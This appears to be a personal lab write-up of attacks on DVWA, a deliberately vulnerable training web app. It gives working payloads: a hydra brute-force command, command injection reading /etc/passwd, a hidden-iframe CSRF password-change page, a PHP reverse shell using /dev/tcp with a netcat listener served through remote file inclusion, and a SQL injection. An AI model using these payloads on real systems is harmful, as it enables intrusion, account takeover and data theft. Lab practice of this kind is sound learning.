# [Brute Force]

--- 

## Steps to Exploit

1. Navigate to a directory with a wordlist in it. Or copy one to a directory. Or set the path to it in hydra.
2. hydra -l admin -P rockyou.txt 192.168.1.117 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=58g00j5r76tjr9jhji9gbif564;security=medium:F=Username and/or password incorrect."
- -l states its a login
- -P calls a pass list
- IP is DVWA dest IP on vlan (hopefully lol)
- Set web server directory
- If you inspect the DVWA login form you will see the name of the elements you need to specify for hydra to know what on the web page its trying to brute force.
- Set cookies. Without DVWA rejects the request as it doesn't represent a legitimate request. Can get these from performing a get request on the server and viewing dev stuff in firefox/chrome/brave etc.
3. Login


# [Command Execution]

--- 

## Steps to Exploit

1. Get an IP from your internal network/vlan.
- In Linux arp -a
2. Different command chaining options
- ; && || | $()
3. Try all of these. Some work
4. 192.168.1.1 | cat /etc/passwd


# [CSRF]

--- 

## Steps to Exploit

1. So to make this a bit more interesting I'll whack it in an iframe. When loaded it will change your password on DVWA.
2. After having a look at network in dev tools the request is a GET request when changing pass
3. Also observed if you have a look in the URL after changing the password the params are very easily editable to change pass
4. Because there isn't a token in the GET request, we don't need to call a specific cookie/user token to choose what accounts password we are changing.
5. Here's the HTML page
- <!DOCTYPE html>
<html>
  <head>
    <title>Error</title>
  </head>
  <body>
    <h2>404 Page Not Found</h2>
    <iframe 
      src="http://192.168.1.117/dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change" 
      width="0" 
      height="0" 
      style="display:none;">
    </iframe>
  </body>
</html>
6. Changes password to 'password123' for the user that is logged in. This only works if the user is logged into the website at the time.
7. To test this work you can boot up burp for your browser and you will see the forward request come through when you load this malicious html file.
8. You can also host a HTTP server on your host as well. Then if I visit (my-host-ip:port-assigned-to-http-server/malicious-html-filename.html it will commit the change.
9. So I could send this link to a mailbox. And anything that clicks on, that is logged in to the website in question. Will have there password changed.
10. CSRF vulnerabilities are quite obsolete now as most modern sites don't send cookies via GET/POST requests.


# [File Inclusion]

---

## Steps to Exploit LOW

- I've done Low here cause I think it's neat. And demonstrates a bit.

1. Alright lets run a .php reverse shell for this
2. Find ur ip on the internal network/vlan
3. <?php exec("/bin/bash -c 'bash -i>& /dev/tcp/192.168.1.120/1234 0>&1'"); ?>
- Save as shell.php
- IP is your Kali machines IP and the port is whatever port you are going to run the listener on
4. 'Python -m http.server'
5. 'nc -lvnp 1234'
6. Now in the URL in DVWA. Set http://192.168.1.117/dvwa/vulnerabilities/fi/?page=http://192.168.1.120:8080/shell.php (Whatever the equivalent is for ur machine)
7. This tricks the web server into running the .php file from our kali machine. Thus, creating a reverse shell. Easy right!

## Steps to Exploit MEDIUM

# [SQL Injection]

---

## Steps to Exploit MEDIUM
1. Looking at the .php code we can see that mysql_real_escape_string is used
- This escapes ' " \ NULL so none of these can be used in the SQLi
2. So instead we will just use 1 OR 1=1
- 1 because we want the first and last name of user 1. OR 1=1 which is always true.
- So the query would look like this in the backend $getid = "SELECT first_name, last_name FROM users WHERE user_id = 1 OR 1=1";
- Which would then set the $id variable to $id=1 OR TRUE
- Thus returning all the values.
